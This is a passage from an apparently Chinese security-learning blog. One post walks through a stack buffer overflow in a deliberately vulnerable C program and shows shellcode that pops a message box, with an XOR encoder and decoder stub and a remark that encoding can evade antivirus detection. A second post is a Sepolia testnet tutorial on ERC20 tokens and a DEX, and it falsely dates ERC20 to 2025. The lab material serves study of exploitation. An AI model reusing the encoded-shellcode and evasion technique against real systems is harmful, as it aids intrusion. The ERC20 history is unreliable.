class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REGCODE <span class="string">&quot;12345678&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify</span><span class="params">(<span class="type">char</span>* code)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flag;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">44</span>];     <span class="comment">//考虑去覆盖 </span></span><br><span class="line">    flag = <span class="built_in">strcmp</span>(REGCODE, code);  <span class="comment">//做比较，去覆盖的code要小于REGCODE，此时比较后flag=1</span></span><br><span class="line">     <span class="comment">//将code填入buffer，因为44位占满后会在末尾补00，因为会将flag的01占用掉，改成00；</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, code);         </span><br><span class="line">    <span class="keyword">return</span> flag;      <span class="comment">//此时flag返回的结果就是0了             </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> vFlag = <span class="number">0</span>;                  </span><br><span class="line">    <span class="type">char</span> regcode[<span class="number">256</span>];         </span><br><span class="line">    <span class="built_in">memset</span>(regcode, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    FILE* fp;</span><br><span class="line">    LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);  <span class="comment">//在windows.h中定义，用于加载MessageBoxA函数</span></span><br><span class="line">    <span class="keyword">if</span> (!(fp = fopen(<span class="string">&quot;reg.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fread(regcode, <span class="number">256</span>, <span class="number">1</span>, fp);</span><br><span class="line">    vFlag = verify(regcode);</span><br><span class="line">    <span class="keyword">if</span> (vFlag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wrong regcode!&quot;</span>);      <span class="comment">//为1时打印</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;passed!&quot;</span>);            <span class="comment">//为0时打印</span></span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​          （<strong>覆盖返回地址法</strong>）因为代码会自动在txt文本后填入00，因此我们在txt文本中构造一个44字节的输入（前8位小于密码），以此达到溢出效果；因此当我们对代码完成编译后，利用x32dbg即可在单步运行中查看到对应的结果显示在随机构造44个数字输入后，程序仍成功运行。  <img src="https://i.postimg.cc/G3srTBzR/aa6dec56cef96c1d5418095008365539.png"></p></li></ul><p>​       基于此，我们尝试用shellcode植入通过buffer（44）去盖住自己，flag（4）和EBP（4）返回地址，使得程序调出消息框的部分换掉53-56字节代码的入口，观察MessagbboxA的函数结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">MessageBoxA</span><span class="params">(</span></span><br><span class="line"><span class="params">    HWND hWnd,           <span class="comment">//用于说明消息框的所属，一般默认为NULL(0)</span></span></span><br><span class="line"><span class="params">    LPCSTR lpText,       <span class="comment">//字符串指针，指向的字符串会在消息框中显示</span></span></span><br><span class="line"><span class="params">    LPCSTR ipCaption,   <span class="comment">//指向字符串会变成消息框的标题</span></span></span><br><span class="line"><span class="params">    UINT uType          <span class="comment">//0代表默认风格，用于控制消息框风格</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>因此我们在x32dbg中调出此API的汇编代码，转换为机器码用16进制工具Hxd填入刚才的reg.txt文件中（在调用前需要将函数的四个参数输入进去，注意顺序要相反,图中内容仅示例），按序提取机器代码，改写为shellcode</p><p><img src="E:\Typora\附件\image-20251210201432798.png" alt="image-20251210201432798"></p><p>我们整理这段机器代码，可以替换两个字符串中得内容，比如随机输入4个数字，同时利用vs studio在verify函数入口打断点，进入调试模式，查看buffer地址，之后利用HdX将机器代码编写进，53-56字节存放buffer地址用于覆盖返回地址，之间用无含义编码<code>NOF</code>(也就是0X90)Reg.txt文本，完成shellcode编写，之后运行.exe文件发现可弹出我们设计好的Shell；至此我们便学会了基于地址覆盖的Shellcode编写.</p><p><img src="https://i.postimg.cc/tJfgZ7Yx/10b225ed3c29b089b5a80b6c9e6de4ce.png"></p><h3 id="Shellcode编写"><a href="#Shellcode编写" class="headerlink" title="Shellcode编写"></a>Shellcode编写</h3><h4 id="编写的难点"><a href="#编写的难点" class="headerlink" title="编写的难点"></a>编写的难点</h4><ul><li>特定字符需要转码（shellcode中若有00还需要转码）</li><li>函数的API需要动态获取（远程操作难定位）</li><li>对于特定操作需要转码（例如我们无法直接push 0 ，那就异或EBX，再传入）</li></ul><h4 id="编写方法"><a href="#编写方法" class="headerlink" title="编写方法"></a>编写方法</h4><p>我们先编写一个最简单的窗口调出代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> main&#123;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后可在vs studio中通过反汇编查看对应汇编代码，若出现push 0 需要通过xor ebx ebx得到0，再push ebx达到同等效果，因此我们可以将其写为汇编形式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    _asm                         <span class="comment">//声明开始书写汇编</span></span><br><span class="line">    &#123;</span><br><span class="line">        xor ebx,ebx</span><br><span class="line">        push ebx</span><br><span class="line">        push ebx</span><br><span class="line">        push ebx</span><br><span class="line">        push ebx</span><br><span class="line">        mov eax,<span class="number">0x75461678</span>         <span class="comment">//MessageBoxA函数在系统中的位置</span></span><br><span class="line">        call eax         </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时再次反汇编查看即可在内存中得到shellcode的机器代码，将其用HxD写入Reg.txt即可构造完整的shellcode。</p><h4 id="编写必要性"><a href="#编写必要性" class="headerlink" title="编写必要性"></a>编写必要性</h4><p>​       我们选择编码对exploit变形的原因主要在于应用程序&#x2F;应用平台的不同，会使字符集有差异从而限制exploit的稳定性；同时对于“危险字符”的变形或者截断会破坏exploit，比如strpy函数对于NULL字符就不可接纳，还会限制0x0D或0x20等字符，因此也需要编写来绕过；同时通过编写以绕过安全检测工具的检测特征也可实现一定程度上的免杀。</p><h4 id="网页Shellcode"><a href="#网页Shellcode" class="headerlink" title="网页Shellcode"></a>网页Shellcode</h4><p>常用base64进行编码。base64是网络上最常见，用于传输8bit字节码的编码方式之一，基于64个可打印字符来表示二进制数据。对于二进制机器代码的编码采用类似于“加壳”的思想：自定义编码（异或，计算，加解密等）→构造解码程序置于shellcode开始执行的地方；当exploit成功，shellcode顶部的解码程序会首先运行将内存中的代码还原成真正的shellcode，然后执行。</p><h4 id="异或编码"><a href="#异或编码" class="headerlink" title="异或编码"></a>异或编码</h4><p>一种简易的编码方法，但在选取编码字节时不可与已有字节相同，否则会出现0（就是怕异或出终止字符00）。用于编码的程序说独立的，在生成shellcode的编码阶段使用；将shellcode代码输入后在结尾放置空指令“\x90”，从而输出异或后的编码。(用一段代码来做示例)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encoder</span><span class="params">(<span class="type">char</span>*input,<span class="type">unsigned</span> <span class="type">char</span> key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>,len = <span class="number">0</span>;</span><br><span class="line">    FILE*fp;</span><br><span class="line">    len = <span class="built_in">strlen</span>(input);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>*output = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)&#123;output[i]=input[i]^key;&#125;</span><br><span class="line">    fp = fopen(<span class="string">&quot;encode.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)&#123;<span class="built_in">fprintf</span>(fp,<span class="string">&quot;\\x%x&quot;</span>,output[i]);&#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dump the encoded shellcode to encode.txt OK!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//结尾记得\x90</span></span><br><span class="line">    <span class="type">char</span> sc[]=<span class="string">&quot;\x77\x9f\x17\x17\x17\x17\xfc\x14\x8d\x41\x33\xbb\x94\xd4\x90&quot;</span>;</span><br><span class="line">    encoder(sc,<span class="number">0x44</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果即为编码后shellcode；</p><h4 id="Shellcode解码"><a href="#Shellcode解码" class="headerlink" title="Shellcode解码"></a>Shellcode解码</h4><p>因为完整的shellcode＝解码程序（释放的）＋编码的shellcode（套壳的）。解码程序（依旧是用之前的key去进行异或得到解码的shellcode）可正常运行的前提为eax在完整的shellcode运行前指向完整的shellcode起始位置，解码程序也要用汇编写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        add eax,<span class="number">0x14</span>       ;越过解码程序（增加偏移量），记录编码后的shellcode的起始地址</span><br><span class="line">        xor ecx,ecx        ;异或清零</span><br><span class="line">     decode_loop:          ;声明一个循环</span><br><span class="line">        mov bl,[eax+ecx]   ;将编码后的逐字节取出</span><br><span class="line">        xor bl,<span class="number">0x44</span>        ;异或</span><br><span class="line">        mov [eax+ecx],bl   ;放回原位置</span><br><span class="line">        inc ecx            ;对ecx+<span class="number">1</span></span><br><span class="line">        cmp bl,<span class="number">0x90</span>        ;看现在bl是否为<span class="number">0x90</span>，是则比较完成跳出循环</span><br><span class="line">        jne decode_loop    ;否则跳回循环</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到相应的机器代码<code>\x83\xc0\x14\x33\xc9\x8a\x1c\x08\x80\xf3\x44\x88\x1c\x08\x41\x80\xfb\x90\x75\xf1</code></p><h4 id="完整的shellcode"><a href="#完整的shellcode" class="headerlink" title="完整的shellcode"></a>完整的shellcode</h4><p>在c语言中写入时，代码前需无回车且不能注释且每个字节前加“\x”；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> ourshellcode[] = <span class="string">&quot;\x83\xc0\x14\x33\xc9\x8a\x1c\x08\x80\xf3\x44\x88\x1c\x08\x41\x80\xfb\x90\x75\xf1\x77\x9f\x17\x17\x17\x17\xfc\x14\x8d\x41\x33\xbb\x94\xd4\x90&quot;</span>;     <span class="comment">//不得回车或换行（这里是一个完整的shellcode）</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    _asm                         <span class="comment">//声明开始书写汇编</span></span><br><span class="line">    &#123;</span><br><span class="line">        lea eax,ourshellcode</span><br><span class="line">        push eax                  <span class="comment">//将shellcode传入栈顶  </span></span><br><span class="line">        ret                       <span class="comment">//弹出栈顶到EIP          </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Software Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> software </tag>
            
            <tag> shellcode </tag>
            
            <tag> vulnerable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web3入门—去中心化交易所的部署</title>
      <link href="/2025/12/05/Web3%E5%85%A5%E9%97%A8%E2%80%94%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E4%BA%A4%E6%98%93%E6%89%80%E7%9A%84%E9%83%A8%E7%BD%B2/"/>
      <url>/2025/12/05/Web3%E5%85%A5%E9%97%A8%E2%80%94%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E4%BA%A4%E6%98%93%E6%89%80%E7%9A%84%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、ERC20代币合约部署"><a href="#一、ERC20代币合约部署" class="headerlink" title="一、ERC20代币合约部署"></a>一、ERC20代币合约部署</h2><blockquote><p>本次代币合约部署过程参考<a href="https://www.wtf.academy/en/course/solidity103/ERC20">https://www.wtf.academy/en/course/solidity103/ERC20</a></p></blockquote><h3 id="ERC20是什么"><a href="#ERC20是什么" class="headerlink" title="ERC20是什么"></a>ERC20是什么</h3><p>​        ERC20是以太坊上的一种代币标准，由Vitalik Buterin于2025年11月提出。它实现了代币转移的基本逻辑：</p><ul><li>账户余额</li><li>转移</li><li>批准转账</li><li>代币总供应量</li><li>令牌信息（optional）：名称、符号、小数</li></ul><p>​        基于此衍生的IERC20规定了代币需要实现的功能和事件，一种接口合约。定义接口的原因在于ERC20代币拥有通用的函数名和输入输出函数；在接口函数中只需要定义函数名和输出输出参数，无需关心函数内部的具体实现方式；因此函数分为内部实现和外部接口两部分，重点在于接口之间共享数据的实现和约定。这就是为什么在合约的实际部署过程之中通常需要ERC20.sol和IERC20.sol来实现一个合约。</p><p>​        Solidity 作为当前社区中一种用于编写以太坊虚拟机 (EVM) 智能合约的主流编程语言，能够帮助我们快速完成本次部署；不过在本次正式开始编写之前，我们还需了解一下OpenZeppelin—覆盖从代币实现到安全工具的Solidity开发标准工具库，其模块化设计有助于我们快速实现安全、标准化的智能合约，同时减少开发和审计的成本。通过合理使用OpenZepplin的模块，可以显著提高合约的安全性。</p><h3 id="编写2个ERC20代币合约"><a href="#编写2个ERC20代币合约" class="headerlink" title="编写2个ERC20代币合约"></a>编写2个ERC20代币合约</h3><p>​        本文中构建的两款具备差异化安全特性的ERC20标准代币MacdonaldA与KFCB，核心目标在于遵循ERC20代币基础规范的同时，针对区块链交易中常见的安全风险引入针对性防护机制。合约开发严格遵守Solidity0.8.20版本语法规范，利用语言内置的溢检查特性替代传统SafeMath库，在精简代码体量的同时保障基础运算的安全准确。</p><p>​         两款代币均通过状态变量完成对核心数据的存储与管理：基础层面，继承自ERC20标准库的内置状态变量（如<code>_balances</code>映射、<code>_totalSupply</code>总量）实现账户余额与代币总供给的记录，<code>_allowance</code>映射则支持代币授权转账功能；在扩展层面MacdonaldA通过<code>_blacklisted</code>映射维护合规黑名单，以<code>MAX_TRANSFER_AMOUNT</code>常量限制单笔转账上限，KFCB通过<code>_timelocks</code>映射为指定账户设置转账时间锁，两类扩展状态变量均与核心交易逻辑深度耦合，形成场景化安全防护。合约构造函数作为初始化入口完成对代币核心信息的定义并初始攻击分配：通过调用ERC20父类构造函数传入代币名称与符号，明确代币身份标识；同时调用<code>_mint</code>函数向合约部署者地址铸造100万枚代币（含18位小数，符合区块链代币通用精度标准）并自动触发ERC20标准的<code>Transfer</code>事件，确保初始分配过程可追溯。</p><p>​        整体交易处理逻辑在继承ERC20标准的<code>_update</code>函数基础上进行安全增强：MacdonaldA重写该函数加入黑名单校验、暂停状态检查及大额转账限制，形成“三重防护”；KFCB通过时间锁校验机制限制处于锁定期的账户发起转账，同时集成ReentrancyGuard库的<code>nonReentrant</code>修饰符，抵御重入攻击。所有安全相关操作均依靠Ownable库实现权限控制，仅合约所有者可执行，确保管理操作的合规性与安全性，具体代码文件已附于附件1，2 。</p><h3 id="应用Remix编译合约"><a href="#应用Remix编译合约" class="headerlink" title="应用Remix编译合约"></a>应用Remix编译合约</h3><p>​        Remix IDE（Remix Ethereum IDE）——以太坊基金会官方维护的开源在线集成开发环境，专为智能合约开发、测试与部署设计，无需本地配置开发环境即可完成从 Solidity 代码编写到区块链部署的全流程操作。考虑到本次实践中的任务规模及便捷程度，使用Remix可以帮助我们节省环境配置时间，其内置的SOlidity编译器也能一站式完成对于我们编写的代币合约的编译、部署与功能测试，因此我们本文中后续有关Solidtiy开发的工作都将在其中进行。</p><p>​         在IDE中完成两份代币合约的编写后，<code>Ctrl+S</code>保存并选择编译器左侧”SOlidity Compiler”中进行编译配置，在”Compiler“下拉菜单中选择0.8.20 版本（Remix将自动加载从Github中加载OpenZepplin合约），完成后分别对两个文件点击 “Solidity Compiler”，出现绿色对勾标志即表示成功编译。</p><p><img src="https://i.postimg.cc/YS5gLXCC/6567b782b7b7146037ae6de16a060c29.png"></p><h3 id="代币合约部署"><a href="#代币合约部署" class="headerlink" title="代币合约部署"></a>代币合约部署</h3><p>​        在以太坊及兼容EVM的区块链中，部署智能合约的本质是向区块两网络中提交一笔【特殊交易】，而钱包是完成这笔交易的核心身份凭证与操作载体。钱包（以MetaMask为例）的核心作用是安全管理私钥——它不会直接暴露私钥，而是通过加密存储、授权签名等方式向区块链节点确认交易确实由地址所有者发起。</p><p>​         部署合约的流程可视为：编译合约—生成字节码—Remix向Metamask发起部署请求—Metamask通过私钥对请求进行签名并广播至区块链网络—节点验证签名合法后执行合约部署逻辑—生成合约地址。</p><p>​         而在合约的部署过程中，考虑到节点的计算、存储、带宽资源等成本，需要消耗对应的Gas(以ETH为单位)，通过支付ETH作为Gas费，向提供计算资源的节点支付报酬，确保合约部署能被全网确认。</p><p>​          在Chorme扩展中安装”Metamask”插件，登录后显示界面，此时钱包内ETH数为0，需要通过复制以太坊钱包地址字符串，进行交易或获取；</p><p><img src="https://i.postimg.cc/QtH3v3Lf/1057112e7b7da6f39adfae9802973137.png"></p><p>​        随后我们在网络中检索faucet发放网站，发现利用谷歌云[<a href="https://cloud.google.com/application/web3/faucet/ethereum/sepolia]%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%EF%BC%8C%E5%A1%AB%E5%86%99%E9%92%B1%E5%8C%85%E5%9C%B0%E5%9D%80%E9%A2%86%E5%8F%960.05">https://cloud.google.com/application/web3/faucet/ethereum/sepolia]可以通过登录账号，填写钱包地址领取0.05</a> ETH&#x2F;d；</p><p><img src="https://i.postimg.cc/t4X8LjWt/c41f336680b7b92ecee7631499750975.png"></p><p>​       返回钱包绑定sepolia后，发现此时ETH已经补充，鉴于合约部署通常gas开销较低，因此基于本次实践的项目体量，可以基于此直接先开展部署。</p><p><img src="https://i.postimg.cc/brnjN9wf/def1a71f48e5aec031ad731408f0ff2a.png"></p><p>​        返回Remix编译器中，点击 “Deploy &amp; run transactions”，环境选择”Injected Provider - MetaMask”，账户填写为对应的以太坊钱包地址，合约选择后点击”Deploy&amp;Verify“开始部署，待Metamask确认完成后，Remix控制台会开始生成交易哈希并等待区块确认，此时**务必记录下每个合约的地址(contact address)**；（图中仅以一个部署为例）</p><blockquote><p>[!CAUTION]</p><p>注意在钱包选择环节记得切换网络，因为它会自动默认连到主网上，需要手动切换到Sepolia  testnet，<strong>部署成功后务必在命令行中点击<code>view on Etherscan</code>不然之后那个官网会不认你，只能重新部署劳财伤神</strong></p></blockquote><p><img src="https://i.postimg.cc/L4kr85Hy/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2025_12_05_070025.png"></p><p>待合约部署成功后，可在Metamask中查看gas消耗详情，并通过合约地址导入代币</p><p><img src="https://i.postimg.cc/dtF1Xh1k/740d8863a9875c9bcc54b129f02c5fbc.png"></p><p>利用Etherscan分别对两个代币合约进行查询：</p><p><img src="https://i.postimg.cc/g09C0Z68/397344f3b65fcc38bf201743b38dc4c2.png"></p><p><img src="https://i.postimg.cc/3RDNMpm3/6396ada15af0dac5f590699b0ea49abb.png"></p><h2 id="二、去中心化交易所合约（DEX）"><a href="#二、去中心化交易所合约（DEX）" class="headerlink" title="二、去中心化交易所合约（DEX）"></a>二、去中心化交易所合约（DEX）</h2><blockquote><p>合约详细部署过程参考<a href="https://www.wtf.academy/en/course/solidity103/DEX">https://www.wtf.academy/en/course/solidity103/DEX</a></p></blockquote><p>​         DEX是基于区块链智能合约实现代币点对点交易的金融协议，其核心优势在于无需第三方托管资产、交易透明可追溯，但原生存在前置交易、价格操纵、流动性过度消耗等风险，需通过机制设计弥补链上公开交易与延迟带来的安全漏洞。</p><p>​        1) 因为链上交易的公开可查，套利者便可通过高Gas费插队（MEV），在用户交易前后插入同向&#x2F;反向交易（三明治攻击），从而利用价格波动获利，其攻击背后本质是”交易信息提前泄露与区块链打包顺序可控“。因此，在基础dex合约上，通过引入”Commit-Reveal”机制隔离交易信息，哈希函数抗碰撞性确保承诺不可伪造，延迟期打破套利者信息优势。具体实现为（完整代码见附件3）：</p><ul><li><p>承诺阶段：</p><p>用户提交哈希<code>commithash=keccak256(abi.encodePacked(secret,toeknIn,amountIn,minAmountOut,deadline))</code>（唯一性），将交易细节隐藏；</p></li><li><p>揭示阶段：</p><p>1min延迟后，用户提交secret验证承诺，执行交易；核心约束在于<code>block.timestamp≥commitTime+1min</code>（延迟执行）。</p></li></ul><p>​        2) 也因链上交易存在延迟，因此瞬时大额交易可操纵池内价格，导致用户实际收益低于预期（滑点），这其中的本质在于”CPMM模型下储备金瞬间失衡”，因此通过滑点保护限制最小收益，TWAP通过时间加权平滑价格抵御瞬时操纵；核心公式基于CPMM与加权平均算法，具体实现方式为</p><ul><li><p>滑点保护：</p><p>交易时检验amountOut≥minAmountOut，amountOut由CPMM公式计算得到:</p></li></ul><p>$$<br>amountOut&#x3D;(amountIn×(1-fee)×reverseOut)&#x2F;(reverseIn+amountIn×(1-fee))(fee为交易费率，reverseIn&#x2F;reverseOut为池内储备金)<br>$$</p><ul><li>TWAP检验：</li></ul><p>存储10条历史价格，计算平均加权，权重与时间正相关。约束为|currentPrice-TWAP|&#x2F;TWAP≤5%。</p><blockquote><p>[!NOTE]</p><p><strong>CPMM（恒定乘积做市商模型）</strong>：是DEX中自动做市商（AMM）的核心定价机制，公式为<em>x</em> × <em>y</em> &#x3D; <em>k</em>，其中x和y是流动性池中两种代币的数量，k是定值。现为主流DEX的基础定价模型；</p><p>价格由储备金比例决定，即<br>$$<br>price_{\frac{A}{B}}&#x3D;\frac{y}{x}\space \space<br>$$</p><p>$$<br>amount_{out}&#x3D;\frac{(amount_{in}×y)}{(x+amount_{in})}(交易计算)<br>$$</p><p><strong>TWAP（时间加权平均价格）</strong>，加权平均算法在时间维度上的应用。</p></blockquote><p>​      3)短期的高频套利交易反复消耗池内流动性，导致储备金失衡，交易滑点扩大，其本质是”套利者低成本占用流动性资源“。通过差异化费率提高高频套利成本，经济激励引导长期交易，核心是”行为-费率“联动机制。其约束为fee≤2%；</p><ul><li>费率公式：</li></ul><p>$$<br>fee&#x3D;BASE_{FEE}+penalty(BASE_{FEE}&#x3D;30&#x2F;10000&#x3D;0.3%)<br>$$</p><ul><li>惩罚规则：24小时交易≥3次，fee提升至1%；两次交易间隔&lt;5min，penalty额外加0.2%。</li></ul><p>​        4)LP代币计算：</p><p>​              首次添加：<code>L = √（amountA × amountB）</code>(初始流动性)；</p><p>​              非首次：<code>L = min(amountA × totalSupply/reverseA,amountB × totalSupply/reverseB) </code>（按比例分配，避免失衡。</p><p>​        基于以上，我们部署一个面向区块链生态的安全增强型去中心化交易所（DEX）智能合约，基于Uniswap V2架构开发，针对当前DEX生态中以上列出的风险集成多重安全机制，实现交易安全性与市场效率的平衡。合约以Solidity 0.8.20为开发语言，依托OpenZeppelin安全组件构建权限控制，防重入等安全层，为去中心化交易提供可验证的安全保障。在部署阶段输入前文中部署的两个代币合约地址，之后顺利生成。</p><p><img src="https://i.postimg.cc/vHmskqT5/3dcd121ce253ea6660e261a80ad06be7.png"></p><h3 id="利用DEX进行代币交换"><a href="#利用DEX进行代币交换" class="headerlink" title="利用DEX进行代币交换"></a>利用DEX进行代币交换</h3><blockquote><p>[!TIP]</p><p>进行此步操作前需确保之前的操作都顺利完成，</p><ul><li>Metamask成功连接到DEX合约所在网络</li><li>测试所需ETH足够</li><li>代币合约在初始部署时需拥有至少10个代币A和一定数量的代币B，以用于添加流动性。</li></ul></blockquote><ol><li><p>授权DEX</p><p>​       在Etherscan中搜索代币A的合约地址，进入代币A的合约界面，点击<code>contact</code>→<code>write contact</code>→连接钱包；</p><p><img src="https://i.postimg.cc/sfTXMZZJ/7b5e4155b352bee95bfa8919743a5c34.png"></p><p>​        成功连接后，点击<code>approve</code>函数，输入参数：<code>spender</code>填入DEX合约地址，<code>amount</code>填入10个代币A对应的数值，完成后点击<code>write</code>即钱包确认交易上链，对代币B重复此操作。</p><p><img src="https://i.postimg.cc/FzjrT7Km/ping-mu-jie-tu-2025-12-05-134753.png"><br>在Remix部署界面找到preComputerCommitmentHash，得到commitmentHash，</p></li></ol><p><img src="https://i.postimg.cc/br4ThxKc/bc6855e5db309cdd9169fcc18df91d70.png"></p><p>​        根据<code>deadline</code>（就是时间戳，可从在线网站查看，但由于合约机制需要加预先时间）和<code>commitimenthash</code>，找到<code>CommitSwap</code>函数入口，将得到的结果输入后，可<code>transact</code>，完成初步的Cmmit端，需要保留得到的结果值以备后患；</p><p><img src="https://i.postimg.cc/XqW5c2SM/432ae3b0fc9209c7e57cf94e6e82451d.png"></p><p>解锁交易，DEX扣取tokenA，发放给tokenB，完成交换。在<code>revealSwap</code>函数端，输入先前的<code>secret</code>…（<strong>与步骤1保持一致</strong>），成功上链后，在Etherscan上查看，交易成功。</p><p><img src="https://i.postimg.cc/XJwq3hQV/7226fc39de0883dd5f25bb12fc31aa6a.png"></p><!--需要注意的是，在部署过程中若发现流动性不够导致无法发起解锁，需要在addLiquidity函数中对两个账号中的代币斤进行补充转移，另外若是设置了滑点限制，需要注意限额，避免自己被回滚--><h2 id="三、前端DAPP接入"><a href="#三、前端DAPP接入" class="headerlink" title="三、前端DAPP接入"></a>三、前端DAPP接入</h2><p>当我们全部完成之后，最后选择已部署合约<code>Balance</code>右侧小按钮可快速部署一个个人网站，按照要求输入DEX合约地址，用户名，在compiler页面找到合约的abi，之后选择自己的域名，添加邮箱和密码就成功部署好了！(<a href="https://kerzyaha.surge.sh/">https://kerzyaha.surge.sh/</a>)</p><p><img src="E:\Typora\附件\848bf3deddcec7a0e59aace2bc7aa034.png" alt="848bf3deddcec7a0e59aace2bc7aa034"></p><p><img src="E:\Typora\附件\1e848875d0f1927e415ac1a1f6c6b6f9.png" 